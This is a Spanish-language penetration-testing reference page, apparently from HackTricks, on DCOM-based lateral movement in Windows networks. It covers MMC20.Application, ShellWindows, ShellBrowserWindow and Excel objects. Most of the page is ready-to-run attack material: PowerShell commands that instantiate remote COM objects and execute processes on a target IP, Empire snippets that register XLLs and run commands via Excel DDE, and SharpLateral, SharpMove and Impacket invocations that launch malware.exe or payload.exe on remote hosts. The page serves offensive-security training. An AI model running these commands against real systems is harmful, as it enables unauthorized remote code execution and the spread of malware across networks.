# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

## MMC20.Application

**Para más información sobre esta técnica, consulta la publicación original en [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Los objetos del Modelo de Objetos de Componente Distribuido (DCOM) presentan una capacidad interesante para interacciones basadas en red con objetos. Microsoft proporciona documentación completa tanto para DCOM como para el Modelo de Objetos de Componente (COM), accesible [aquí para DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y [aquí para COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Una lista de aplicaciones DCOM se puede recuperar utilizando el comando de PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
El objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite la automatización de operaciones de complementos de MMC. Notablemente, este objeto contiene un método `ExecuteShellCommand` bajo `Document.ActiveView`. Más información sobre este método se puede encontrar [aquí](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Verifique su funcionamiento:

Esta función facilita la ejecución de comandos a través de una red mediante una aplicación DCOM. Para interactuar con DCOM de forma remota como administrador, se puede utilizar PowerShell de la siguiente manera:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando se conecta a la aplicación DCOM y devuelve una instancia del objeto COM. Luego se puede invocar el método ExecuteShellCommand para ejecutar un proceso en el host remoto. El proceso implica los siguientes pasos:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtener RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```
## ShellWindows & ShellBrowserWindow

**Para más información sobre esta técnica, consulta la publicación original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

El objeto **MMC20.Application** fue identificado como carente de "LaunchPermissions" explícitos, por defecto a permisos que permiten el acceso a Administradores. Para más detalles, se puede explorar un hilo [aquí](https://twitter.com/tiraniddo/status/817532039771525120), y se recomienda el uso de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET para filtrar objetos sin Permiso de Lanzamiento explícito.

Se destacaron dos objetos específicos, `ShellBrowserWindow` y `ShellWindows`, debido a su falta de Permisos de Lanzamiento explícitos. La ausencia de una entrada de registro `LaunchPermission` bajo `HKCR:\AppID\{guid}` significa que no hay permisos explícitos.

### ShellWindows

Para `ShellWindows`, que carece de un ProgID, los métodos .NET `Type.GetTypeFromCLSID` y `Activator.CreateInstance` facilitan la instanciación del objeto utilizando su AppID. Este proceso aprovecha OleView .NET para recuperar el CLSID de `ShellWindows`. Una vez instanciado, es posible interactuar a través del método `WindowsShell.Item`, lo que lleva a la invocación de métodos como `Document.Application.ShellExecute`.

Se proporcionaron ejemplos de comandos de PowerShell para instanciar el objeto y ejecutar comandos de forma remota:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)

# Need to upload the file to execute
$COM = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.APPLICATION", "192.168.52.100"))
$COM.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\calc.exe", $Null, $Null, "7")
```
### Movimiento Lateral con Objetos DCOM de Excel

El movimiento lateral se puede lograr explotando objetos DCOM de Excel. Para obtener información detallada, se recomienda leer la discusión sobre el aprovechamiento de Excel DDE para el movimiento lateral a través de DCOM en [el blog de Cybereason](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

El proyecto Empire proporciona un script de PowerShell, que demuestra la utilización de Excel para la ejecución remota de código (RCE) manipulando objetos DCOM. A continuación se presentan fragmentos del script disponible en [el repositorio de GitHub de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), que muestran diferentes métodos para abusar de Excel para RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
### Herramientas de Automatización para Movimiento Lateral

Se destacan dos herramientas para automatizar estas técnicas:

- **Invoke-DCOM.ps1**: Un script de PowerShell proporcionado por el proyecto Empire que simplifica la invocación de diferentes métodos para ejecutar código en máquinas remotas. Este script es accesible en el repositorio de GitHub de Empire.

- **SharpLateral**: Una herramienta diseñada para ejecutar código de forma remota, que se puede utilizar con el comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Herramientas Automáticas

- El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar fácilmente todas las formas comentadas de ejecutar código en otras máquinas.
- Puedes usar `dcomexec.py` de Impacket para ejecutar comandos en sistemas remotos utilizando DCOM.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"
```
- También podrías usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- También podrías usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referencias

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

{{#include ../../banners/hacktricks-training.md}}
